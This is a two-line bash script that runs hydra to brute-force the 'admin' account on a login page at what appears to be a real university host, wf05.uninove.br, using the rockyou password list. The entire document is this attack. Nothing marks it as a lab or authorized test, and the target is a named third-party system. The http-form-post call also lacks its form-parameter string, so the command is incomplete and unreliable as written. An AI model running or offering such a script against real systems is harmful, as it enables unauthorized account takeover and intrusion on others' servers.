#!/bin/bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt wf05.uninove.br/admin/login.jsp http-form-post;
